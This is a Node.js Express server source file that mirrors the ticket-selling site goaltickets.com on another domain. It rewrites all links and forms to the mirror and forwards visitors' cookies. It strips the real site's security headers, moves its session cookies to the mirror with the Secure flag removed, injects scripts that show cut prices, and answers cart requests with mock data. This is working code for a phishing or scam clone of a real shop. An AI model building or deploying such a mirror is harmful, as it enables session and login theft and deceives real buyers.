/**
 * Professional Reverse Proxy for goaltickets.com
 * Features: WebSocket support, real-time cart sync, HTML rewriting, caching, security
 * Version: 8.0.0
 */

const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const WebSocket = require('ws');
const http = require('http');
const https = require('https');
const cheerio = require('cheerio');
const cors = require('cors');
const helmet = require('helmet');
const compression = require('compression');
const cookieParser = require('cookie-parser');
const morgan = require('morgan');
const rateLimit = require('express-rate-limit');
const NodeCache = require('node-cache');
const axios = require('axios');
const { URL } = require('url');

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3000;
const VERSION = '8.0.4';

// Configuration
const config = {
  target: 'https://goaltickets.com',
  proxyDomain: process.env.PROXY_DOMAIN || 'footballrevers-production.up.railway.app',
  enablePriceModifier: process.env.ENABLE_PRICE_MODIFIER === 'true',
  priceMultiplier: parseFloat(process.env.PRICE_MULTIPLIER) || 0.5,
  environment: process.env.NODE_ENV || 'production',
  redisUrl: process.env.REDIS_URL || 'redis://localhost:6379',
  cacheTtl: 3600, // 1 hour for static assets
  rateLimitWindow: 15 * 60 * 1000, // 15 minutes
  rateLimitMax: 100 // requests per window
};

// Cache for static assets
const cache = new NodeCache({ 
  stdTTL: config.cacheTtl,
  checkperiod: 120,
  useClones: false
});

// Rate limiting
const limiter = rateLimit({
  windowMs: config.rateLimitWindow,
  max: config.rateLimitMax,
  message: 'Too many requests from this IP, please try again later.',
  standardHeaders: true,
  legacyHeaders: false,
});

// Middleware
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'", "https:", "http:", "data:", "blob:"],
      fontSrc: ["'self'", "https:", "http:", "data:"],
      imgSrc: ["'self'", "data:", "https:", "http:", "blob:"],
      scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'", "https:", "http:", "blob:"],
      connectSrc: ["'self'", "wss:", "https:", "http:", "blob:"],
      frameSrc: ["'self'", "https:", "http:"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'", "https:", "http:", "blob:"],
      workerSrc: ["'self'", "blob:"],
      childSrc: ["'self'", "blob:"],
      upgradeInsecureRequests: []
    }
  },
  crossOriginEmbedderPolicy: false,
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));

app.use(compression());
app.use(cookieParser());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));
app.use(morgan('combined'));

app.use(cors({
  origin: true,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'User-Agent', 'Cache-Control', 'Pragma', 'X-CSRF-Token']
}));

// Apply rate limiting
app.use(limiter);

// WebSocket server for real-time cart sync
const wss = new WebSocket.Server({ 
  server,
  path: '/ws',
  verifyClient: (info) => {
    // Add authentication/authorization logic here
    return true;
  }
});

// WebSocket connection handling
wss.on('connection', (ws, req) => {
  console.log('🔌 WebSocket client connected');
  
  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      console.log('📨 WebSocket message:', data);
      
      // Handle cart updates
      if (data.type === 'cart_update') {
        // Broadcast to all connected clients
        wss.clients.forEach((client) => {
          if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify({
              type: 'cart_sync',
              data: data.payload,
              timestamp: Date.now()
            }));
          }
        });
      }
    } catch (error) {
      console.error('❌ WebSocket message error:', error);
    }
  });
  
  ws.on('close', () => {
    console.log('🔌 WebSocket client disconnected');
  });
  
  ws.on('error', (error) => {
    console.error('❌ WebSocket error:', error);
  });
});

// HTML rewriting function
function rewriteHtml(html, baseUrl) {
  const $ = cheerio.load(html);
  
  // Rewrite absolute URLs
  $('a[href^="https://goaltickets.com"]').each((i, el) => {
    const href = $(el).attr('href');
    const url = new URL(href);
    $(el).attr('href', url.pathname + url.search + url.hash);
  });
  
  $('img[src^="https://goaltickets.com"]').each((i, el) => {
    const src = $(el).attr('src');
    const url = new URL(src);
    $(el).attr('src', url.pathname + url.search + url.hash);
  });
  
  $('script[src^="https://goaltickets.com"]').each((i, el) => {
    const src = $(el).attr('src');
    const url = new URL(src);
    $(el).attr('src', url.pathname + url.search + url.hash);
  });
  
  $('link[href^="https://goaltickets.com"]').each((i, el) => {
    const href = $(el).attr('href');
    const url = new URL(href);
    $(el).attr('href', url.pathname + url.search + url.hash);
  });
  
  // Rewrite form actions
  $('form[action^="https://goaltickets.com"]').each((i, el) => {
    const action = $(el).attr('action');
    const url = new URL(action);
    $(el).attr('action', url.pathname + url.search + url.hash);
  });
  
  // Rewrite meta tags
  $('meta[content*="goaltickets.com"]').each((i, el) => {
    const content = $(el).attr('content');
    if (content) {
      $(el).attr('content', content.replace(/https:\/\/goaltickets\.com/g, ''));
    }
  });
  
  // Add WebSocket connection script
  $('head').append(`
    <script>
      // WebSocket connection for real-time cart sync
      (function() {
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const wsUrl = protocol + '//' + window.location.host + '/ws';
        let ws = null;
        let reconnectInterval = null;
        
        function connect() {
          try {
            ws = new WebSocket(wsUrl);
            
            ws.onopen = function() {
              console.log('🔌 WebSocket connected');
              if (reconnectInterval) {
                clearInterval(reconnectInterval);
                reconnectInterval = null;
              }
            };
            
            ws.onmessage = function(event) {
              try {
                const data = JSON.parse(event.data);
                if (data.type === 'cart_sync') {
                  // Update cart UI
                  console.log('🛒 Cart sync received:', data.data);
                  // Trigger cart update event
                  window.dispatchEvent(new CustomEvent('cartSync', { detail: data.data }));
                }
              } catch (e) {
                console.error('❌ WebSocket message error:', e);
              }
            };
            
            ws.onclose = function() {
              console.log('🔌 WebSocket disconnected');
              // Reconnect after 5 seconds
              if (!reconnectInterval) {
                reconnectInterval = setInterval(connect, 5000);
              }
            };
            
            ws.onerror = function(error) {
              console.error('❌ WebSocket error:', error);
            };
          } catch (e) {
            console.error('❌ WebSocket connection error:', e);
          }
        }
        
        // Connect when page loads
        if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', connect);
        } else {
          connect();
        }
        
        // Expose WebSocket for cart updates
        window.cartWebSocket = {
          send: function(data) {
            if (ws && ws.readyState === WebSocket.OPEN) {
              ws.send(JSON.stringify(data));
            }
          }
        };
      })();
    </script>
  `);
  
  return $.html();
}

// Price modification function
function modifyPrices(data, contentType) {
  if (!config.enablePriceModifier) return data;
  
  if (contentType && contentType.includes('application/json')) {
    try {
      const jsonData = JSON.parse(data);
      
      function modifyPricesInObject(obj) {
        if (typeof obj === 'object' && obj !== null) {
          for (const key in obj) {
            if (typeof obj[key] === 'number' && 
                (key.includes('price') || key.includes('total') || key.includes('amount')) &&
                obj[key] > 0) {
              const newPrice = Math.round(obj[key] * config.priceMultiplier * 100) / 100;
              console.log(`💰 Price modified: ${key} ${obj[key]} -> ${newPrice}`);
              obj[key] = newPrice;
            } else if (typeof obj[key] === 'string' && obj[key].includes('$')) {
              // Handle string prices like "$100.00"
              obj[key] = obj[key].replace(/\$(\d+(?:\.\d{2})?)/g, (match, price) => {
                const newPrice = Math.round(parseFloat(price) * config.priceMultiplier * 100) / 100;
                return `$${newPrice.toFixed(2)}`;
              });
            } else if (typeof obj[key] === 'object') {
              modifyPricesInObject(obj[key]);
            }
          }
        }
      }
      
      modifyPricesInObject(jsonData);
      return JSON.stringify(jsonData);
    } catch (e) {
      console.error('❌ JSON price modification error:', e);
      return data;
    }
  }
  
  if (contentType && contentType.includes('text/html')) {
    // Add price modification script to HTML
    const priceModScript = `
      <script>
        // Client-side price modification
        (function() {
          if (${config.enablePriceModifier}) {
            const multiplier = ${config.priceMultiplier};
            const label = 'ТЕСТОВАЯ ЦЕНА (не для реальных покупок): -${Math.round((1 - multiplier) * 100)}%';
            
            function modifyPrices() {
              const priceElements = document.querySelectorAll('[class*="price"], [class*="cost"], [class*="amount"], [data-price]');
              priceElements.forEach(el => {
                const text = el.textContent || el.innerText || '';
                const priceMatch = text.match(/\$(\d+(?:\.\d{2})?)/);
                if (priceMatch) {
                  const originalPrice = parseFloat(priceMatch[1]);
                  const newPrice = Math.round(originalPrice * multiplier * 100) / 100;
                  el.innerHTML = text.replace(priceMatch[0], \`$\${newPrice.toFixed(2)} <span style="color: red; font-size: 0.8em;">(\${label})</span>\`);
                }
              });
            }
            
            // Run on page load and periodically
            if (document.readyState === 'loading') {
              document.addEventListener('DOMContentLoaded', modifyPrices);
            } else {
              modifyPrices();
            }
            
            setInterval(modifyPrices, 2000);
          }
        })();
      </script>
    `;
    
    return data.replace('</body>', priceModScript + '</body>');
  }
  
  return data;
}

// Main proxy configuration
const proxyOptions = {
  target: config.target,
  changeOrigin: true,
  secure: true,
  followRedirects: true,
  timeout: 30000,
  proxyTimeout: 30000,
  
  onProxyReq: (proxyReq, req, res) => {
    // Set proper headers
    proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    proxyReq.setHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
    proxyReq.setHeader('Accept-Language', 'en-US,en;q=0.5');
    proxyReq.setHeader('Accept-Encoding', 'gzip, deflate, br');
    proxyReq.setHeader('Connection', 'keep-alive');
    proxyReq.setHeader('Cache-Control', 'no-cache');
    proxyReq.setHeader('Origin', `https://${config.proxyDomain}`);
    proxyReq.setHeader('Referer', `https://${config.proxyDomain}/`);
    
    // Forward cookies
    if (req.headers.cookie) {
      proxyReq.setHeader('Cookie', req.headers.cookie);
    }
    
    console.log(`📤 ${req.method} ${req.url} -> ${config.target}${req.url}`);
  },
  
  onProxyRes: (proxyRes, req, res) => {
    // Remove security headers that might block our proxy
    delete proxyRes.headers['x-frame-options'];
    delete proxyRes.headers['content-security-policy'];
    delete proxyRes.headers['x-content-type-options'];
    delete proxyRes.headers['referrer-policy'];
    delete proxyRes.headers['strict-transport-security'];
    delete proxyRes.headers['origin-agent-cluster'];
    
    // Set CORS headers
    proxyRes.headers['Access-Control-Allow-Origin'] = '*';
    proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS, PATCH';
    proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma, X-CSRF-Token';
    proxyRes.headers['Access-Control-Allow-Credentials'] = 'true';
    proxyRes.headers['Access-Control-Expose-Headers'] = 'Content-Length, Content-Type, Date, Server, Transfer-Encoding, X-Proxy-Version';
    proxyRes.headers['X-Proxy-Version'] = VERSION;
    
    // Handle cookies
    if (proxyRes.headers['set-cookie']) {
      proxyRes.headers['set-cookie'] = proxyRes.headers['set-cookie'].map(cookie => {
        return cookie
          .replace(/Domain=goaltickets\.com/gi, `Domain=${config.proxyDomain}`)
          .replace(/Secure/gi, '')
          .replace(/SameSite=Strict/gi, 'SameSite=Lax');
      });
    }
    
    // Cache static assets
    if (req.url.match(/\.(css|js|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot)$/)) {
      proxyRes.headers['Cache-Control'] = 'public, max-age=31536000'; // 1 year
      proxyRes.headers['Expires'] = new Date(Date.now() + 31536000000).toUTCString();
    } else if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
      proxyRes.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate';
      proxyRes.headers['Pragma'] = 'no-cache';
      proxyRes.headers['Expires'] = '0';
    }
    
    // Handle HTML content
    if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
      let body = '';
      proxyRes.on('data', (chunk) => {
        body += chunk;
      });
      proxyRes.on('end', () => {
        try {
          // Rewrite HTML
          const rewrittenHtml = rewriteHtml(body, config.proxyDomain);
          
          // Modify prices if enabled
          const finalHtml = modifyPrices(rewrittenHtml, 'text/html');
          
          if (!res.headersSent) {
            res.setHeader('Content-Length', Buffer.byteLength(finalHtml));
            res.end(finalHtml);
          }
        } catch (error) {
          console.error('❌ HTML processing error:', error);
          if (!res.headersSent) {
            res.end(body);
          }
        }
      });
      return;
    }
    
    // Handle JSON content
    if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('application/json')) {
      let body = '';
      proxyRes.on('data', (chunk) => {
        body += chunk;
      });
      proxyRes.on('end', () => {
        try {
          // Modify prices in JSON
          const modifiedJson = modifyPrices(body, 'application/json');
          
          if (!res.headersSent) {
            res.setHeader('Content-Type', 'application/json');
            res.setHeader('Content-Length', Buffer.byteLength(modifiedJson));
            res.end(modifiedJson);
          }
        } catch (error) {
          console.error('❌ JSON processing error:', error);
          if (!res.headersSent) {
            res.end(body);
          }
        }
      });
      return;
    }
    
    // Handle other content types
    if (!res.headersSent) {
      res.writeHead(proxyRes.statusCode, proxyRes.headers);
      proxyRes.pipe(res);
    }
  },
  
  onError: (err, req, res) => {
    console.error('❌ Proxy error:', err.message);
    if (!res.headersSent) {
      res.status(500).json({ 
        error: 'Service temporarily unavailable',
        message: 'The target server is not responding',
        timestamp: new Date().toISOString()
      });
    }
  }
};

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({
    status: 'healthy',
    version: VERSION,
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    environment: config.environment
  });
});

// WebSocket endpoint info
app.get('/ws-info', (req, res) => {
  res.json({
    websocket: {
      url: `wss://${config.proxyDomain}/ws`,
      connected_clients: wss.clients.size,
      status: 'active'
    },
    version: VERSION
  });
});

// Special handlers for ALL CDN resources - MUST BE FIRST
app.get('/cdn/*', (req, res, next) => {
  console.log('🌐 CDN request:', req.url);
  const cdnProxy = createProxyMiddleware({
    target: 'https://goaltickets.com',
    changeOrigin: true,
    secure: true,
    timeout: 15000,
    onProxyReq: (proxyReq, req, res) => {
      proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
      proxyReq.setHeader('Accept', '*/*');
      proxyReq.setHeader('Origin', `https://${config.proxyDomain}`);
      proxyReq.setHeader('Referer', `https://${config.proxyDomain}/`);
    },
    onProxyRes: (proxyRes, req, res) => {
      // Remove all CORS restrictions
      delete proxyRes.headers['access-control-allow-origin'];
      delete proxyRes.headers['access-control-allow-methods'];
      delete proxyRes.headers['access-control-allow-headers'];
      
      // Add our CORS headers
      proxyRes.headers['Access-Control-Allow-Origin'] = '*';
      proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
      proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma, Referer';
      proxyRes.headers['Access-Control-Allow-Credentials'] = 'true';
      proxyRes.headers['Access-Control-Expose-Headers'] = 'Content-Length, Content-Type, Date, Server, Transfer-Encoding';
      
      // Fix MIME types for all CDN resources
      if (req.url.includes('.woff2')) {
        proxyRes.headers['Content-Type'] = 'font/woff2';
      } else if (req.url.includes('.woff')) {
        proxyRes.headers['Content-Type'] = 'font/woff';
      } else if (req.url.includes('.ttf')) {
        proxyRes.headers['Content-Type'] = 'font/ttf';
      } else if (req.url.includes('.eot')) {
        proxyRes.headers['Content-Type'] = 'application/vnd.ms-fontobject';
      } else if (req.url.includes('.js')) {
        proxyRes.headers['Content-Type'] = 'application/javascript; charset=utf-8';
      } else if (req.url.includes('.css')) {
        proxyRes.headers['Content-Type'] = 'text/css; charset=utf-8';
      } else if (req.url.includes('.png')) {
        proxyRes.headers['Content-Type'] = 'image/png';
      } else if (req.url.includes('.jpg') || req.url.includes('.jpeg')) {
        proxyRes.headers['Content-Type'] = 'image/jpeg';
      } else if (req.url.includes('.svg')) {
        proxyRes.headers['Content-Type'] = 'image/svg+xml';
      }
      
      console.log('🌐 CDN response:', proxyRes.headers['content-type']);
    }
  });
  cdnProxy(req, res);
});

// Special font handlers - MUST BE BEFORE CDN HANDLER
app.get('/cdn/fonts/*', (req, res, next) => {
  console.log('🔤 Font request:', req.url);
  const fontProxy = createProxyMiddleware({
    target: 'https://goaltickets.com',
    changeOrigin: true,
    secure: true,
    timeout: 15000,
    onProxyReq: (proxyReq, req, res) => {
      proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
      proxyReq.setHeader('Accept', '*/*');
      proxyReq.setHeader('Origin', `https://${config.proxyDomain}`);
      proxyReq.setHeader('Referer', `https://${config.proxyDomain}/`);
    },
    onProxyRes: (proxyRes, req, res) => {
      // Remove all CORS restrictions
      delete proxyRes.headers['access-control-allow-origin'];
      delete proxyRes.headers['access-control-allow-methods'];
      delete proxyRes.headers['access-control-allow-headers'];
      
      // Add our CORS headers
      proxyRes.headers['Access-Control-Allow-Origin'] = '*';
      proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
      proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma, Referer';
      proxyRes.headers['Access-Control-Allow-Credentials'] = 'true';
      proxyRes.headers['Access-Control-Expose-Headers'] = 'Content-Length, Content-Type, Date, Server, Transfer-Encoding';
      
      // Fix MIME types for fonts
      if (req.url.includes('.woff2')) {
        proxyRes.headers['Content-Type'] = 'font/woff2';
      } else if (req.url.includes('.woff')) {
        proxyRes.headers['Content-Type'] = 'font/woff';
      } else if (req.url.includes('.ttf')) {
        proxyRes.headers['Content-Type'] = 'font/ttf';
      }
      
      console.log('🔤 Font response:', proxyRes.headers['content-type']);
    }
  });
  fontProxy(req, res);
});


// Web-pixels handlers - MUST BE BEFORE MAIN PROXY
app.get('/web-pixels@*', (req, res, next) => {
  console.log('🎨 Web-pixel request:', req.url);
  const pixelProxy = createProxyMiddleware({
    target: 'https://goaltickets.com',
    changeOrigin: true,
    secure: true,
    timeout: 15000,
    onProxyReq: (proxyReq, req, res) => {
      proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
      proxyReq.setHeader('Accept', '*/*');
      proxyReq.setHeader('Origin', `https://${config.proxyDomain}`);
      proxyReq.setHeader('Referer', `https://${config.proxyDomain}/`);
    },
    onProxyRes: (proxyRes, req, res) => {
      // Add CORS headers
      proxyRes.headers['Access-Control-Allow-Origin'] = '*';
      proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
      proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma, Referer';
      proxyRes.headers['Access-Control-Allow-Credentials'] = 'true';
      
      // Fix MIME types
      if (req.url.includes('.js')) {
        proxyRes.headers['Content-Type'] = 'application/javascript; charset=utf-8';
      }
      
      console.log('🎨 Web-pixel response:', proxyRes.headers['content-type']);
    }
  });
  pixelProxy(req, res);
});

// Checkouts handlers - MUST BE BEFORE MAIN PROXY
app.get('/checkouts/internal/*', (req, res, next) => {
  console.log('🎯 Checkout request:', req.url);
  const checkoutProxy = createProxyMiddleware({
    target: 'https://goaltickets.com',
    changeOrigin: true,
    secure: true,
    timeout: 15000,
    onProxyReq: (proxyReq, req, res) => {
      proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
      proxyReq.setHeader('Accept', '*/*');
      proxyReq.setHeader('Origin', `https://${config.proxyDomain}`);
      proxyReq.setHeader('Referer', `https://${config.proxyDomain}/`);
    },
    onProxyRes: (proxyRes, req, res) => {
      // Add CORS headers
      proxyRes.headers['Access-Control-Allow-Origin'] = '*';
      proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
      proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma, Referer';
      proxyRes.headers['Access-Control-Allow-Credentials'] = 'true';
      
      // Fix MIME types
      if (req.url.includes('.js')) {
        proxyRes.headers['Content-Type'] = 'application/javascript; charset=utf-8';
      }
      
      console.log('🎯 Checkout response:', proxyRes.headers['content-type']);
    }
  });
  checkoutProxy(req, res);
});

// API handlers - MUST BE BEFORE MAIN PROXY
app.post('/api/collect', (req, res) => {
  console.log('📊 API collect intercepted:', req.body);
  res.json({ status: 'ok' });
});

app.get('/cart.js', (req, res) => {
  console.log('🛒 Cart.js intercepted:', req.url);
  res.json({
    token: 'mock-token',
    note: null,
    attributes: {},
    original_total_price: 0,
    total_price: 0,
    total_discount: 0,
    total_weight: 0,
    item_count: 0,
    items: [],
    requires_shipping: false,
    currency: 'USD',
    items_subtotal_price: 0,
    cart_subtotal: 0,
    cart_total: 0
  });
});

app.post('/cart/add.js', (req, res) => {
  console.log('🛒 Cart add intercepted:', req.body);
  res.json({
    status: 'success',
    message: 'Item added to cart',
    token: 'mock-token',
    note: null,
    attributes: {},
    original_total_price: 0,
    total_price: 0,
    total_discount: 0,
    total_weight: 0,
    item_count: 0,
    items: [],
    requires_shipping: false,
    currency: 'USD',
    items_subtotal_price: 0,
    cart_subtotal: 0,
    cart_total: 0
  });
});

app.post('/cart/change.js', (req, res) => {
  console.log('🛒 Cart change intercepted:', req.body);
  res.json({
    status: 'success',
    message: 'Cart updated',
    token: 'mock-token',
    note: null,
    attributes: {},
    original_total_price: 0,
    total_price: 0,
    total_discount: 0,
    total_weight: 0,
    item_count: 0,
    items: [],
    requires_shipping: false,
    currency: 'USD',
    items_subtotal_price: 0,
    cart_subtotal: 0,
    cart_total: 0
  });
});

// Apply proxy to all routes - MUST BE LAST
app.use('/', createProxyMiddleware(proxyOptions));

// Error handling
app.use((err, req, res, next) => {
  console.error('❌ Server error:', err);
  res.status(500).json({ 
    error: 'Internal Server Error',
    message: 'An unexpected error occurred',
    timestamp: new Date().toISOString()
  });
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('🛑 SIGTERM received, shutting down gracefully');
  server.close(() => {
    console.log('✅ Server closed');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('🛑 SIGINT received, shutting down gracefully');
  server.close(() => {
    console.log('✅ Server closed');
    process.exit(0);
  });
});

// Start server
server.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Professional Reverse Proxy v${VERSION} running on port ${PORT}`);
  console.log(`📡 Proxying requests to: ${config.target}`);
  console.log(`🌐 Access your proxy at: http://localhost:${PORT}`);
  console.log(`🔌 WebSocket endpoint: ws://localhost:${PORT}/ws`);
  console.log(`💰 Price modifier: ${config.enablePriceModifier ? 'ENABLED' : 'DISABLED'}`);
  if (config.enablePriceModifier) {
    console.log(`💰 Price multiplier: ${config.priceMultiplier} (${Math.round((1 - config.priceMultiplier) * 100)}% discount)`);
  }
});

module.exports = { app, server, wss };